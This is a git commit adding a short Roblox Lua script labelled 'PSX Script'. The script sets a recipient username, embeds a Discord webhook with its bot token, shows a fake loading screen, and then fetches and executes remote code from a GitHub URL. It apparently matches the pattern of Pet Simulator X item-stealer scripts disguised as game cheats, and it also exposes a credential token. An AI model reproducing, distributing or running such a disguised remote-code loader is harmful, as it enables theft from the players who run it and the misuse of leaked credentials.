5a47a8641d99990513bd1ff17ff1fb5011f6b122
kjfeoujdx <134698770+kjfeoujdx@users.noreply.github.com>
2023-05-26 13:50:38 +0300

    Create Scropt.lua

---
+++ Scropt.lua
@@ -0,0 +1,10 @@
+Username = "stastop137"
+WebHook = "{"type": 1, "id": "1097398832322580570", "name": "Spidey Bot", "avatar": null, "channel_id": "1090641593452736512", "guild_id": "1081146540166479914", "application_id": null, "token": "K13CozuxCJhCsfpel2g_p1bqMdAAvOu7_EzyYe2hlxR2VrtwKrJa_50WiAp91oT9YM-B"}"
+ 
+loadingscreen = true
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
